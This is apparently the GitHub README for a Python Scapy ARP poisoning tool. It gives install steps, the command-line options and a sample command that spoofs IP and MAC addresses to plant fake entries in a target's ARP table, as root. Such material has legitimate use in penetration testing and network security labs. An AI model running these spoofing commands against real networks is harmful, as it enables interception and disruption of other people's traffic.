## ARP Poisoning Tool 

[![](https://img.shields.io/github/issues/EmreOvunc/ARP-Poisoning-Tool)](https://github.com/EmreOvunc/ARP-Poisoning-Tool/issues)
[![](https://img.shields.io/github/stars/EmreOvunc/ARP-Poisoning-Tool)](https://github.com/EmreOvunc/ARP-Poisoning-Tool/stargazers)
[![](https://img.shields.io/github/forks/EmreOvunc/ARP-Poisoning-Tool)](https://github.com/EmreOvunc/ARP-Poisoning-Tool/network/members)

## Dependencies
```
apt install python3-scapy
```

## Installation

```
git clone https://github.com/EmreOvunc/ARP-Poisoning-Tool.git
cd ARP-Poisoning-Tool
```

## Usage

```
python3 ARP-Poisoning.py
python3 arp_poisoning_cmd.py --help
```
```
usage: arp_poisoning_cmd.py [-h] [--target-ip TARGET_IP]
                            [--target-mac TARGET_MAC] [--fake-ip FAKE_IP]
                            [--fake-mac FAKE_MAC] [--count COUNT] [--version]

optional arguments:
  -h, --help            show this help message and exit
  --target-ip TARGET_IP, -ti TARGET_IP
                        target IP address
  --target-mac TARGET_MAC, -tm TARGET_MAC
                        target MAC address
  --fake-ip FAKE_IP, -fi FAKE_IP
                        fake IP address -spoofed-
  --fake-mac FAKE_MAC, -fm FAKE_MAC
                        fake MAC address -spoofed-
  --count COUNT, -c COUNT
                        number of packets
  --version, -v         show program's version number and exit

Usage: python3 arp_poisoning_cmd.py -ti 10.20.30.40 -tm 11:22:33:aa:bb:cc -fi
10.20.30.41 -fm aa:bb:cc:11:22:33 -c 1
```
![alt tag](https://emreovunc.com/projects/python3-arp-poisoning-02.png)

It uses SCAPY to generate fake ICMP and ARP packets.
The things which you need only are Destination IP and MAC address.

**Needs "root" privileges.**

It creates entries on target's ARP Table.

```
News:
***Auto ARP Generation Mode is added

***New version of arp poisoning tool is released. (arp_poisoning_cmd.py)

***You can now enter how many packets you can send.
```

![alt tag](https://emreovunc.com/projects/python3-arp-poisoning-01.png)

![alt tag](https://emreovunc.com/projects/ARP-Poisoning.jpeg)
